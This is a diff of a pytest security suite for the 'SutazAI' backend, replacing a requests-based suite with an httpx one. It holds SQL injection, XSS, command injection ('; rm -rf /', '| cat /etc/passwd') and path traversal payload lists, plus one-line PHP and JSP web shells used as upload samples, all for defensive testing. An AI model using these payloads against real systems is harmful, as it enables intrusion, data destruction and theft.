@@ -1,1097 +1,660 @@
+#!/usr/bin/env python3
 """
-Comprehensive security tests for SutazAI system
-Tests authentication, authorization, input validation, and security hardening
+Comprehensive Security Tests for SutazAI System
+Validates security requirements per Rules 1-19
 """
-
-import logging
-
-# Configure logger for exception handling
-logger = logging.getLogger(__name__)
 
 import pytest
-import requests
+import asyncio
+import httpx
 import json
-import time
-import hashlib
 import base64
+import hashlib
+import secrets
+import time
 import jwt
+from typing import Dict, Any, List
 from datetime import datetime, timedelta
-from typing import Dict, List, Optional, Any
-import subprocess
 import os
-import socket
-import ssl
-import urllib.parse
-from unittest.mock import patch, Mock
-
+import sys
+import re
+from urllib.parse import quote, unquote
+import xml.etree.ElementTree as ET
 
 # Test configuration
-BASE_URL = "http://localhost:8000"
-FRONTEND_URL = "http://localhost:8501"
-TIMEOUT = 10
-
-
-class TestAuthenticationSecurity:
-    """Test authentication security mechanisms."""
-
-    def test_jwt_token_validation(self):
-        """Test JWT token validation and security."""
-        # Test with invalid token
-        invalid_jwt = "bad.jwt"
-        headers = {"Authorization": f"Bearer {invalid_jwt}"}
-        
-        protected_endpoints = [
-            "/api/agents",
-            "/api/metrics", 
-            "/api/chat",
-            "/api/orchestration"
-        ]
-        
-        for endpoint in protected_endpoints:
-            try:
-                response = requests.get(f"{BASE_URL}{endpoint}", headers=headers, timeout=TIMEOUT)
-                # Should either reject invalid token (401) or not require auth (200/404)
-                assert response.status_code in [200, 401, 404], f"Unexpected status for {endpoint}: {response.status_code}"
-            except requests.exceptions.ConnectionError:
-                pytest.skip(f"Cannot connect to {endpoint}")
-
-    def test_token_expiration_handling(self):
-        """Test expired token handling."""
-        # Create expired token (if JWT is used)
-        try:
-            expired_payload = {
-                "user_id": "test_user",
-                "exp": datetime.utcnow() - timedelta(hours=1)  # Expired 1 hour ago
-            }
-            
-            # Create token with test secret (this would fail in real system)
-            expired_token = jwt.encode(expired_payload, "test_secret", algorithm="HS256")
-            headers = {"Authorization": f"Bearer {expired_token}"}
-            
-            response = requests.get(f"{BASE_URL}/api/agents", headers=headers, timeout=TIMEOUT)
-            
-            # Should reject expired token
-            if response.status_code == 401:
-                # Good - token was rejected
-                assert True
-            elif response.status_code in [200, 404]:
-                # Endpoint might not require auth or token validation not implemented
-                pytest.skip("Token validation not implemented or not required")
-            else:
-                pytest.fail(f"Unexpected response to expired token: {response.status_code}")
-                
-        except ImportError:
-            pytest.skip("JWT library not available")
-        except requests.exceptions.ConnectionError:
-            pytest.skip("Cannot connect to backend")
-
-    def test_brute_force_protection(self):
-        """Test brute force attack protection."""
-        # Simulate multiple failed login attempts
-        login_endpoint = f"{BASE_URL}/auth/login"
-        
-        failed_attempts = []
-        for i in range(5):
-            try:
-                response = requests.post(
-                    login_endpoint,
-                    json={"username": "test_user", "password": f"wrong_password_{i}"},
-                    timeout=TIMEOUT
-                )
-                failed_attempts.append(response.status_code)
-                time.sleep(0.1)  # Small delay between attempts
-            except requests.exceptions.ConnectionError:
-                pytest.skip("Login endpoint not available")
-        
-        # Check if rate limiting or account lockout is implemented
-        # This test passes if the endpoint doesn't exist (404) or implements protection
-        if all(status == 404 for status in failed_attempts):
-            pytest.skip("Login endpoint not implemented")
-        elif any(status == 429 for status in failed_attempts):
-            # Rate limiting detected
-            assert True
-        elif any(status == 423 for status in failed_attempts):
-            # Account lockout detected
-            assert True
-        else:
-            # No protection detected - this is informational
-            pytest.skip("Brute force protection not detected (may not be implemented)")
-
-    def test_session_management(self):
-        """Test session management security."""
-        # Test session endpoint if available
-        session_endpoint = f"{BASE_URL}/auth/session"
-        
-        try:
-            response = requests.get(session_endpoint, timeout=TIMEOUT)
-            
-            if response.status_code == 200:
-                # Check for secure session management
-                data = response.json()
-                
-                # Check for session security attributes
-                security_checks = []
-                
-                if "session_id" in data:
-                    session_id = data["session_id"]
-                    # Session ID should be sufficiently long and random
-                    security_checks.append(len(session_id) >= 16)
-                
-                if "expires_at" in data:
-                    # Session should have expiration
-                    security_checks.append(True)
-                
-                # At least some security measures should be present
-                assert any(security_checks) or len(security_checks) == 0
-                
-            elif response.status_code == 404:
-                pytest.skip("Session management endpoint not implemented")
-            else:
-                # Other status codes are acceptable
-                assert response.status_code in [401, 403]
-                
-        except requests.exceptions.ConnectionError:
-            pytest.skip("Session endpoint not available")
-
-    def test_password_security_requirements(self):
-        """Test password security requirements."""
-        # Test password change endpoint if available
-        password_endpoint = f"{BASE_URL}/auth/password"
-        
-        weak_passwords = [
-            "123456",
-            "password",
-            "admin",
-            "test",
-            "12345678"
-        ]
-        
-        for weak_password in weak_passwords:
-            try:
-                response = requests.post(
-                    password_endpoint,
-                    json={
-                        "current_password": "old_password",
-                        "new_password": weak_password
-                    },
-                    timeout=TIMEOUT
-                )
-                
-                if response.status_code == 400:
-                    # Good - weak password was rejected
-                    assert True
-                elif response.status_code == 404:
-                    pytest.skip("Password change endpoint not implemented")
-                    break
-                elif response.status_code in [401, 403]:
-                    # Authentication required - expected
-                    assert True
-                    break
-                else:
-                    # Weak password might have been accepted - this is informational
-                    pass
-                    
-            except requests.exceptions.ConnectionError:
-                pytest.skip("Password endpoint not available")
-                break
-
-
-class TestInputValidationSecurity:
-    """Test input validation and sanitization."""
-
-    def test_sql_injection_protection(self):
-        """Test SQL injection protection."""
-        sql_injection_payloads = [
-            "'; DROP TABLE users; --",
-            "' OR '1'='1",
-            "' UNION SELECT * FROM users --",
-            "'; INSERT INTO users VALUES ('hacker', 'pass'); --",
-            "' OR 1=1 --"
-        ]
-        
-        # Test various endpoints with SQL injection payloads
-        test_endpoints = [
-            ("/api/agents", "GET", {"search": None}),
-            ("/api/metrics", "GET", {"filter": None}),
-            ("/api/chat", "POST", {"message": None})
-        ]
-        
-        for endpoint, method, param_template in test_endpoints:
-            for payload in sql_injection_payloads:
-                try:
-                    if method == "GET":
-                        params = {k: payload if v is None else v for k, v in param_template.items()}
-                        response = requests.get(f"{BASE_URL}{endpoint}", params=params, timeout=TIMEOUT)
-                    else:
-                        data = {k: payload if v is None else v for k, v in param_template.items()}
-                        response = requests.post(f"{BASE_URL}{endpoint}", json=data, timeout=TIMEOUT)
-                    
-                    # Should not return database errors or succeed with malicious payload
-                    assert response.status_code not in [500]  # Internal server error might indicate SQL injection
-                    
-                    # Check response content for SQL error messages
-                    if response.headers.get('content-type', '').startswith('application/json'):
-                        try:
-                            response_data = response.json()
-                            response_text = json.dumps(response_data).lower()
-                        except (AssertionError, Exception) as e:
-                            # TODO: Review this exception handling
-                            logger.error(f"Unexpected exception: {e}", exc_info=True)
-                            response_text = response.text.lower()
-                    else:
-                        response_text = response.text.lower()
-                    
-                    sql_error_indicators = [
-                        "sql syntax", "mysql", "postgresql", "sqlite", "ora-", "syntax error"
-                    ]
-                    
-                    for indicator in sql_error_indicators:
-                        assert indicator not in response_text, f"Possible SQL injection vulnerability: {indicator} found in response"
-                    
-                except requests.exceptions.ConnectionError:
-                    pytest.skip(f"Cannot connect to {endpoint}")
-                    break
-
-    def test_xss_protection(self):
-        """Test Cross-Site Scripting (XSS) protection."""
-        xss_payloads = [
-            "<script>alert('XSS')</script>",
-            "javascript:alert('XSS')",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "'\"><script>alert('XSS')</script>"
-        ]
-        
-        # Test chat endpoint which likely displays user input
-        for payload in xss_payloads:
-            try:
-                response = requests.post(
-                    f"{BASE_URL}/api/chat",
-                    json={"message": payload},
-                    timeout=TIMEOUT
-                )
-                
-                if response.status_code == 200:
-                    try:
-                        data = response.json()
-                        response_text = json.dumps(data)
-                        
-                        # Check if payload was properly escaped/sanitized
-                        assert payload not in response_text, "XSS payload returned unescaped"
-                        
-                        # Check for HTML entities (proper escaping)
-                        if "<script>" in payload:
-                            assert "&lt;script&gt;" in response_text or "<script>" not in response_text
-                            
-                    except json.JSONDecodeError:
-                        # Non-JSON response is acceptable
-                        pass
-                elif response.status_code == 404:
-                    pytest.skip("Chat endpoint not implemented")
-                    break
-                    
-            except requests.exceptions.ConnectionError:
-                pytest.skip("Chat endpoint not available")
-                break
-
-    def test_command_injection_protection(self):
-        """Test command injection protection."""
-        command_injection_payloads = [
-            "; ls -la",
-            "| cat /etc/passwd",
-            "&& whoami",
-            "`id`",
-            "$(whoami)",
-            "; rm -rf /",
-            "|| ping -c 1 127.0.0.1"
-        ]
-        
-        # Test endpoints that might process system commands
-        for payload in command_injection_payloads:
-            try:
-                # Test chat endpoint
-                response = requests.post(
-                    f"{BASE_URL}/api/chat",
-                    json={"message": f"Execute: {payload}"},
-                    timeout=TIMEOUT
-                )
-                
-                if response.status_code == 200:
-                    try:
-                        data = response.json()
-                        response_text = json.dumps(data).lower()
-                        
-                        # Check for command execution indicators
-                        command_indicators = [
-                            "uid=", "gid=", "groups=",  # id command output
-                            "total ", "drwx",  # ls command output
-                            "root:", "daemon:",  # /etc/passwd content
-                            "ping statistics"  # ping command output
-                        ]
-                        
-                        for indicator in command_indicators:
-                            assert indicator not in response_text, f"Possible command injection: {indicator} found in response"
-                            
-                    except json.JSONDecodeError:
-                        pass
-                elif response.status_code == 404:
-                    pytest.skip("Chat endpoint not implemented")
-                    break
-                    
-            except requests.exceptions.ConnectionError:
-                pytest.skip("Chat endpoint not available")
-                break
-
-    def test_path_traversal_protection(self):
-        """Test path traversal protection."""
-        path_traversal_payloads = [
-            "../../../etc/passwd",
-            "..\\..\\..\\windows\\system32\\config\\sam",
-            "....//....//....//etc/passwd",
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-            "..%252f..%252f..%252fetc%252fpasswd"
-        ]
-        
-        # Test file access endpoints
-        for payload in path_traversal_payloads:
-            try:
-                # Test static files or document endpoints
-                response = requests.get(f"{BASE_URL}/files/{payload}", timeout=TIMEOUT)
-                
-                if response.status_code == 200:
-                    content = response.text.lower()
-                    
-                    # Check for system file content
-                    system_file_indicators = [
-                        "root:x:", "daemon:x:",  # /etc/passwd
-                        "[boot loader]",  # Windows boot.ini
-                        "administrator:"  # Windows SAM
-                    ]
-                    
-                    for indicator in system_file_indicators:
-                        assert indicator not in content, f"Path traversal successful: {indicator} found"
-                elif response.status_code == 404:
-                    # Good - file not found or endpoint doesn't exist
-                    assert True
-                elif response.status_code == 403:
-                    # Good - access denied
-                    assert True
-                    
-            except requests.exceptions.ConnectionError:
-                pytest.skip("File endpoint not available")
-                break
-
-    def test_file_upload_security(self):
-        """Test file upload security."""
-        # Test malicious file uploads
-        malicious_files = [
-            ("malicious.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
-            ("malicious.jsp", b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
-            ("malicious.exe", b"MZ\x90\x00\x03\x00\x00\x00", "application/x-executable"),
-            ("../../../evil.txt", b"Path traversal test", "text/plain")
-        ]
-        
-        upload_endpoint = f"{BASE_URL}/api/upload"
-        
-        for filename, content, content_type in malicious_files:
-            try:
-                files = {
-                    'file': (filename, content, content_type)
-                }
-                
-                response = requests.post(upload_endpoint, files=files, timeout=TIMEOUT)
-                
-                if response.status_code == 200:
-                    # File upload succeeded - check if proper validation was done
-                    try:
-                        data = response.json()
-                        
-                        # Check if dangerous file was rejected or sanitized
-                        if "filename" in data:
-                            stored_filename = data["filename"]
-                            # Filename should be sanitized
-                            assert "../" not in stored_filename
-                            assert not stored_filename.endswith(('.php', '.jsp', '.exe'))
-                        
-                    except json.JSONDecodeError:
-                        pass
-                elif response.status_code in [400, 403, 413, 415]:
-                    # Good - file was rejected
-                    assert True
-                elif response.status_code == 404:
-                    pytest.skip("Upload endpoint not implemented")
-                    break
-                    
-            except requests.exceptions.ConnectionError:
-                pytest.skip("Upload endpoint not available")
-                break
-
-
-class TestAuthorizationSecurity:
-    """Test authorization and access control."""
-
-    def test_role_based_access_control(self):
-        """Test role-based access control."""
-        # Test admin-only endpoints
-        admin_endpoints = [
-            "/admin/users",
-            "/admin/system",
-            "/admin/config",
-            "/api/admin/agents",
-            "/api/admin/metrics"
-        ]
-        
-        for endpoint in admin_endpoints:
-            try:
-                # Test without authorization
-                response = requests.get(f"{BASE_URL}{endpoint}", timeout=TIMEOUT)
-                
-                # Should require authentication/authorization
-                assert response.status_code in [401, 403, 404], f"Admin endpoint {endpoint} not properly protected"
-                
-            except requests.exceptions.ConnectionError:
-                pytest.skip(f"Cannot connect to {endpoint}")
-
-    def test_user_data_isolation(self):
-        """Test user data isolation."""
-        # Test user-specific endpoints with different user IDs
-        user_endpoints = [
-            "/api/users/123/profile",
-            "/api/users/456/conversations",
-            "/api/users/789/settings"
-        ]
-        
-        for endpoint in user_endpoints:
-            try:
-                response = requests.get(f"{BASE_URL}{endpoint}", timeout=TIMEOUT)
-                
-                # Should require proper authorization for user data access
-                if response.status_code == 200:
-                    # If accessible, should not contain other users' data
-                    try:
-                        data = response.json()
-                        # This test is informational - proper testing would require authentication
-                        assert isinstance(data, (dict, list))
-                    except json.JSONDecodeError:
-                        pass
-                else:
-                    # Authentication/authorization required - good
-                    assert response.status_code in [401, 403, 404]
-                    
-            except requests.exceptions.ConnectionError:
-                pytest.skip(f"Cannot connect to {endpoint}")
-
-    def test_privilege_escalation_protection(self):
-        """Test privilege escalation protection."""
-        # Test role modification endpoints
-        privilege_endpoints = [
-            ("/api/users/123/role", {"role": "admin"}),
-            ("/api/users/123/permissions", {"permissions": ["admin", "write", "delete"]}),
-            ("/admin/promote", {"user_id": "123", "role": "admin"})
-        ]
-        
-        for endpoint, payload in privilege_endpoints:
-            try:
-                response = requests.post(f"{BASE_URL}{endpoint}", json=payload, timeout=TIMEOUT)
-                
-                # Should require proper authorization for privilege changes
-                assert response.status_code in [401, 403, 404], f"Privilege escalation endpoint {endpoint} not properly protected"
-                
-            except requests.exceptions.ConnectionError:
-                pytest.skip(f"Cannot connect to {endpoint}")
-
-
-class TestSecurityHeaders:
-    """Test security headers and HTTPS configuration."""
-
-    def test_security_headers_presence(self):
-        """Test presence of security headers."""
-        try:
-            response = requests.get(f"{BASE_URL}/health", timeout=TIMEOUT)
-            
-            security_headers = {
-                "X-Content-Type-Options": "nosniff",
-                "X-Frame-Options": ["DENY", "SAMEORIGIN"],
-                "X-XSS-Protection": "1; mode=block",
-                "Strict-Transport-Security": None,  # Should be present for HTTPS
-                "Content-Security-Policy": None,  # Should have some CSP
-                "Referrer-Policy": None
-            }
-            
-            headers_present = []
-            
-            for header, expected_values in security_headers.items():
-                if header in response.headers:
-                    headers_present.append(header)
-                    
-                    if expected_values and isinstance(expected_values, list):
-                        assert response.headers[header] in expected_values
-                    elif expected_values and isinstance(expected_values, str):
-                        assert response.headers[header] == expected_values
-            
-            # At least some security headers should be present
-            # This is informational - not all may be implemented
-            if headers_present:
-                assert len(headers_present) > 0
-            else:
-                pytest.skip("No security headers detected (may not be implemented)")
-                
-        except requests.exceptions.ConnectionError:
-            pytest.skip("Cannot connect to backend")
-
-    def test_cors_configuration(self):
-        """Test CORS configuration security."""
-        try:
-            # Test preflight request
-            headers = {
-                "Origin": "https://malicious-site.com",
-                "Access-Control-Request-Method": "POST",
-                "Access-Control-Request-Headers": "Content-Type"
-            }
-            
-            response = requests.options(f"{BASE_URL}/api/chat", headers=headers, timeout=TIMEOUT)
-            
-            if "Access-Control-Allow-Origin" in response.headers:
-                allowed_origin = response.headers["Access-Control-Allow-Origin"]
-                
-                # Should not allow all origins in production
-                if allowed_origin == "*":
-                    # This might be acceptable for development but should be noted
-                    pytest.skip("CORS allows all origins (may be development configuration)")
-                else:
-                    # Specific origins are better for security
-                    assert True
-            else:
-                # CORS might not be implemented
-                pytest.skip("CORS headers not found")
-                
-        except requests.exceptions.ConnectionError:
-            pytest.skip("Cannot connect to backend")
-
-    def test_https_configuration(self):
-        """Test HTTPS configuration if available."""
-        # Try HTTPS version of the URL
-        https_url = BASE_URL.replace("http://", "https://")
-        
-        try:
-            response = requests.get(f"{https_url}/health", timeout=TIMEOUT, verify=True)
-            
-            # If HTTPS is available, check security
-            if response.status_code == 200:
-                # Check for HSTS header
-                if "Strict-Transport-Security" in response.headers:
-                    hsts_header = response.headers["Strict-Transport-Security"]
-                    # Should have reasonable max-age
-                    assert "max-age" in hsts_header
-                else:
-                    pytest.skip("HSTS header not present (may not be required for development)")
-            
-        except (requests.exceptions.ConnectionError, requests.exceptions.SSLError):
-            pytest.skip("HTTPS not available or SSL configuration issues")
-
-    def test_cookie_security(self):
-        """Test cookie security attributes."""
-        try:
-            response = requests.get(f"{BASE_URL}/auth/login", timeout=TIMEOUT)
-            
-            if response.cookies:
-                for cookie in response.cookies:
-                    # Check cookie security attributes
-                    cookie_string = str(cookie)
-                    
-                    # For session cookies, should have security attributes
-                    if "session" in cookie.name.lower() or "auth" in cookie.name.lower():
-                        # Should have HttpOnly flag
-                        assert cookie.get("httponly", False) or "HttpOnly" in cookie_string
-                        
-                        # Should have Secure flag for HTTPS
-                        if BASE_URL.startswith("https"):
-                            assert cookie.get("secure", False) or "Secure" in cookie_string
-            else:
-                pytest.skip("No cookies found in authentication response")
-                
-        except requests.exceptions.ConnectionError:
-            pytest.skip("Cannot connect to authentication endpoint")
-
-
-class TestApiSecurity:
-    """Test API-specific security measures."""
-
-    def test_rate_limiting(self):
-        """Test API rate limiting."""
-        # Test with rapid requests
-        responses = []
-        
-        for i in range(20):  # Send 20 rapid requests
-            try:
-                start_time = time.time()
-                response = requests.get(f"{BASE_URL}/health", timeout=TIMEOUT)
-                end_time = time.time()
-                
-                responses.append({
-                    "status_code": response.status_code,
-                    "response_time": end_time - start_time,
-                    "headers": dict(response.headers)
-                })
-                
-                time.sleep(0.1)  # Small delay
-                
-            except requests.exceptions.ConnectionError:
-                pytest.skip("Cannot connect to backend")
-                break
-        
-        if responses:
-            # Check for rate limiting responses
-            rate_limited = [r for r in responses if r["status_code"] == 429]
-            
-            if rate_limited:
-                # Rate limiting is implemented
-                assert True
-                
-                # Check for rate limit headers
-                for response in rate_limited:
-                    headers = response["headers"]
-                    rate_limit_headers = [
-                        "X-RateLimit-Limit",
-                        "X-RateLimit-Remaining", 
-                        "X-RateLimit-Reset",
-                        "Retry-After"
-                    ]
-                    
-                    # At least one rate limiting header should be present
-                    has_rate_limit_header = any(header in headers for header in rate_limit_headers)
-                    if has_rate_limit_header:
-                        assert True
-                        break
-            else:
-                # No rate limiting detected
-                pytest.skip("Rate limiting not detected (may not be implemented)")
-
-    def test_api_versioning_security(self):
-        """Test API versioning security."""
-        # Test different API versions
-        version_endpoints = [
-            "/api/v1/health",
-            "/api/v2/health", 
-            "/v1/health",
-            "/v2/health"
-        ]
-        
-        accessible_versions = []
-        
-        for endpoint in version_endpoints:
-            try:
-                response = requests.get(f"{BASE_URL}{endpoint}", timeout=TIMEOUT)
-                if response.status_code == 200:
-                    accessible_versions.append(endpoint)
-            except requests.exceptions.ConnectionError:
-                continue
-        
-        # Multiple API versions might be available
-        # This is informational - not necessarily a security issue
-        if len(accessible_versions) > 1:
-            pytest.skip(f"Multiple API versions accessible: {accessible_versions}")
-        elif len(accessible_versions) == 1:
-            assert True  # Single version is good
-        else:
-            pytest.skip("No versioned API endpoints found")
-
-    def test_information_disclosure(self):
-        """Test for information disclosure vulnerabilities."""
-        # Test endpoints that might expose sensitive information
-        info_endpoints = [
-            "/debug",
-            "/info", 
-            "/status",
-            "/version",
-            "/config",
-            "/api/debug",
-            "/api/info",
-            "/.env",
-            "/robots.txt",
-            "/sitemap.xml"
-        ]
-        
-        disclosed_info = []
-        
-        for endpoint in info_endpoints:
-            try:
-                response = requests.get(f"{BASE_URL}{endpoint}", timeout=TIMEOUT)
-                
-                if response.status_code == 200:
-                    content = response.text.lower()
-                    
-                    # Check for sensitive information
-                    sensitive_patterns = [
-                        "password", "secret", "key", "token", "private",
-                        "database", "connection", "config", "env"
-                    ]
-                    
-                    for pattern in sensitive_patterns:
-                        if pattern in content:
-                            disclosed_info.append(f"{endpoint}: {pattern}")
-                            
-            except requests.exceptions.ConnectionError:
-                continue
-        
-        if disclosed_info:
-            # Information disclosure detected
-            for disclosure in disclosed_info:
-                pytest.skip(f"Potential information disclosure: {disclosure}")
-        else:
-            # No obvious information disclosure
-            assert True
-
-    def test_error_handling_security(self):
-        """Test secure error handling."""
-        # Test with malformed requests to trigger errors
-        error_tests = [
-            ("Invalid JSON", f"{BASE_URL}/api/chat", {"data": "invalid json{"}),
-            ("Missing fields", f"{BASE_URL}/api/chat", {}),
-            ("Invalid method", f"{BASE_URL}/api/agents", "DELETE"),
-            ("Large payload", f"{BASE_URL}/api/chat", {"message": "A" * 10000})
-        ]
-        
-        for test_name, url, payload in error_tests:
-            try:
-                if isinstance(payload, str):  # HTTP method test
-                    response = requests.request(payload, url, timeout=TIMEOUT)
-                else:
-                    response = requests.post(url, json=payload, timeout=TIMEOUT)
-                
-                # Check error response for information disclosure
-                if response.status_code >= 400:
-                    content = response.text.lower()
-                    
-                    # Should not expose internal details
-                    sensitive_error_info = [
-                        "traceback", "stack trace", "internal server error",
-                        "database error", "sql", "file path", "directory"
-                    ]
-                    
-                    for info in sensitive_error_info:
-                        assert info not in content, f"Error response contains sensitive info: {info}"
-                
-            except requests.exceptions.ConnectionError:
-                continue
-
-
-class TestFrontendSecurity:
-    """Test frontend security measures."""
-
-    def test_frontend_security_headers(self):
-        """Test frontend security headers."""
-        try:
-            response = requests.get(FRONTEND_URL, timeout=TIMEOUT)
-            
-            if response.status_code == 200:
-                # Check for frontend security headers
-                frontend_headers = {
-                    "X-Content-Type-Options": "nosniff",
-                    "X-Frame-Options": None,  # Should prevent clickjacking
-                    "Content-Security-Policy": None  # Should have CSP
-                }
-                
-                for header in frontend_headers:
-                    if header in response.headers:
-                        assert True  # Header is present
-                        
-                # Check content for inline scripts (potential XSS risk)
-                content = response.text
-                
-                # Streamlit apps may have inline scripts, but check for obvious XSS
-                xss_patterns = [
-                    "javascript:alert(",
-                    "onerror=alert(",
-                    "onload=alert("
-                ]
-                
-                for pattern in xss_patterns:
-                    assert pattern not in content, f"Potential XSS pattern found: {pattern}"
-            
-        except requests.exceptions.ConnectionError:
-            pytest.skip("Frontend not available")
-
-    def test_frontend_resource_access(self):
-        """Test frontend resource access security."""
-        # Test access to static resources
-        resource_paths = [
-            "/_stcore/static/",
-            "/static/",
-            "/assets/",
-            "/.streamlit/"
-        ]
-        
-        for path in resource_paths:
-            try:
-                response = requests.get(f"{FRONTEND_URL}{path}", timeout=TIMEOUT)
-                
-                # Directory listing should not be enabled
-                if response.status_code == 200:
-                    content = response.text.lower()
-                    directory_indicators = [
-                        "index of", "directory listing", "<title>index of"
-                    ]
-                    
-                    for indicator in directory_indicators:
-                        assert indicator not in content, f"Directory listing enabled: {path}"
-                        
-            except requests.exceptions.ConnectionError:
-                continue
-
-
-class TestSecurityMisconfiguration:
-    """Test for security misconfigurations."""
-
-    def test_default_credentials(self):
-        """Test for default credentials."""
-        default_creds = [
-            ("admin", "admin"),
-            ("admin", "password"),
-            ("root", "root"),
-            ("admin", "123456"),
-            ("user", "user")
-        ]
-        
-        login_endpoint = f"{BASE_URL}/auth/login"
-        
-        for username, password in default_creds:
-            try:
-                response = requests.post(
-                    login_endpoint,
-                    json={"username": username, "password": password},
-                    timeout=TIMEOUT
-                )
-                
-                # Default credentials should not work
-                assert response.status_code != 200, f"Default credentials work: {username}:{password}"
-                
-            except requests.exceptions.ConnectionError:
-                pytest.skip("Login endpoint not available")
-                break
-
-    def test_debug_mode_disabled(self):
-        """Test that debug mode is disabled."""
-        debug_indicators = [
-            "/debug",
-            "?debug=1",
-            "?debug=true",
-            "&debug=1"
-        ]
-        
-        base_endpoints = ["/", "/health", "/api/agents"]
-        
-        for endpoint in base_endpoints:
-            for debug_param in debug_indicators:
-                try:
-                    test_url = f"{BASE_URL}{endpoint}{debug_param}"
-                    response = requests.get(test_url, timeout=TIMEOUT)
-                    
-                    if response.status_code == 200:
-                        content = response.text.lower()
-                        
-                        # Should not contain debug information
-                        debug_patterns = [
-                            "debug mode", "traceback", "stack trace",
-                            "django debug", "flask debug", "development mode"
-                        ]
-                        
-                        for pattern in debug_patterns:
-                            assert pattern not in content, f"Debug mode may be enabled: {pattern}"
-                            
-                except requests.exceptions.ConnectionError:
-                    continue
-
-    def test_unnecessary_services_disabled(self):
-        """Test that unnecessary services are disabled."""
-        # Test for common unnecessary services
-        unnecessary_services = [
-            ("FTP", 21),
-            ("Telnet", 23), 
-            ("SMTP", 25),
-            ("DNS", 53),
-            ("TFTP", 69),
-            ("POP3", 110),
-            ("IMAP", 143),
-            ("SNMP", 161),
-            ("LDAP", 389)
-        ]
-        
-        localhost = "127.0.0.1"
-        open_ports = []
-        
-        for service_name, port in unnecessary_services:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
-            
-            try:
-                result = sock.connect_ex((localhost, port))
-                if result == 0:
-                    open_ports.append((service_name, port))
-            except (AssertionError, Exception) as e:
-                # Suppressed exception (was bare except)
-                logger.debug(f"Suppressed exception: {e}")
-                pass
-            finally:
-                sock.close()
-        
-        # Report open unnecessary ports (informational)
-        if open_ports:
-            ports_info = ", ".join([f"{name}({port})" for name, port in open_ports])
-            pytest.skip(f"Unnecessary services detected: {ports_info}")
-        else:
-            assert True  # No unnecessary services detected
-
-
-class TestSecurityMonitoring:
-    """Test security monitoring capabilities."""
-
-    def test_security_logging(self):
-        """Test security event logging."""
-        # Generate security events
-        security_events = [
-            ("Failed login", f"{BASE_URL}/auth/login", {"username": "admin", "password": "wrong"}),
-            ("Admin access attempt", f"{BASE_URL}/admin/users", {}),
-            ("SQL injection attempt", f"{BASE_URL}/api/search", {"q": "'; DROP TABLE users; --"})
-        ]
-        
-        for event_name, url, payload in security_events:
-            try:
-                if payload:
-                    requests.post(url, json=payload, timeout=TIMEOUT)
-                else:
-                    requests.get(url, timeout=TIMEOUT)
-                    
-                # In a real system, these events should be logged
-                # This test is informational
-                
-            except requests.exceptions.ConnectionError:
-                continue
-        
-        # This test passes as it's about generating events for logging
-        assert True
-
-    def test_intrusion_detection(self):
-        """Test intrusion detection capabilities."""
-        # Simulate suspicious activity patterns
-        suspicious_patterns = [
-            "Rapid requests",
-            "Multiple failed authentications", 
-            "Port scanning simulation",
-            "SQL injection attempts"
-        ]
-        
-        # Generate suspicious activity
-        for _ in range(10):  # Rapid requests
-            try:
-                requests.get(f"{BASE_URL}/health", timeout=1)
-                time.sleep(0.05)
-            except (AssertionError, Exception) as e:
-                # Suppressed exception (was bare except)
-                logger.debug(f"Suppressed exception: {e}")
-                pass
-        
-        # Multiple failed logins
-        for _ in range(5):
-            try:
-                requests.post(
-                    f"{BASE_URL}/auth/login",
-                    json={"username": "admin", "password": "wrong"},
-                    timeout=TIMEOUT
-                )
-            except (AssertionError, Exception) as e:
-                # Suppressed exception (was bare except)
-                logger.debug(f"Suppressed exception: {e}")
-                pass
-        
-        # This test is informational - actual IDS would be external
-        pytest.skip("Intrusion detection testing is informational")
+BASE_URL = os.getenv('TEST_BASE_URL', 'http://localhost:10010')
+TEST_TIMEOUT = 30.0
 
 
 @pytest.mark.security
-class TestSecurityCompliance:
-    """Test security compliance requirements."""
-
-    def test_data_encryption_in_transit(self):
-        """Test data encryption in transit."""
-        # This test checks if HTTPS is enforced
-        https_url = BASE_URL.replace("http://", "https://")
-        
-        try:
-            # Try HTTPS first
-            response = requests.get(f"{https_url}/health", timeout=TIMEOUT, verify=True)
-            if response.status_code == 200:
-                assert True  # HTTPS is working
-            else:
-                pytest.skip("HTTPS not properly configured")
-                
-        except (requests.exceptions.ConnectionError, requests.exceptions.SSLError):
-            # HTTPS not available, check if HTTP redirects to HTTPS
-            try:
-                response = requests.get(f"{BASE_URL}/health", timeout=TIMEOUT, allow_redirects=False)
-                if response.status_code in [301, 302, 307, 308]:
-                    location = response.headers.get("Location", "")
-                    if location.startswith("https://"):
-                        assert True  # HTTP redirects to HTTPS
-                    else:
-                        pytest.skip("HTTP does not redirect to HTTPS")
-                else:
-                    pytest.skip("HTTPS not available and no redirect from HTTP")
-            except requests.exceptions.ConnectionError:
-                pytest.skip("Cannot test HTTPS configuration")
-
-    def test_security_audit_trail(self):
-        """Test security audit trail capabilities."""
-        # Test if security events can be audited
-        audit_endpoints = [
-            "/admin/audit",
-            "/api/audit",
-            "/security/logs"
+class TestInputValidation:
+    """Test input validation and sanitization"""
+    
+    @pytest.mark.asyncio
+    async def test_xss_protection(self):
+        """Test protection against XSS attacks"""
+        xss_payloads = [
+            '<script>alert("xss")</script>',
+            '<img src="x" onerror="alert(1)">',
+            'javascript:alert("xss")',
+            '<svg onload="alert(1)">',
+            '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
+            '<iframe src="javascript:alert(1)"></iframe>',
+            '<body onload="alert(1)">',
+            '<input type="image" src="x" onerror="alert(1)">'  
         ]
         
-        for endpoint in audit_endpoints:
-            try:
-                response = requests.get(f"{BASE_URL}{endpoint}", timeout=TIMEOUT)
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            for payload in xss_payloads:
+                # Test XSS in chat message
+                chat_request = {
+                    'message': payload,
+                    'model': 'tinyllama'
+                }
                 
-                # Audit endpoints should require authentication
-                assert response.status_code in [401, 403, 404]
+                response = await client.post(
+                    f"{BASE_URL}/api/v1/chat/",
+                    json=chat_request
+                )
                 
-            except requests.exceptions.ConnectionError:
-                continue
-        
-        # This test passes if audit endpoints are protected or not implemented
-        assert True
-
-    def test_vulnerability_disclosure(self):
-        """Test vulnerability disclosure information."""
-        # Check for security.txt or vulnerability disclosure policy
-        disclosure_paths = [
-            "/.well-known/security.txt",
-            "/security.txt",
-            "/vulnerability-disclosure",
-            "/responsible-disclosure"
-        ]
-        
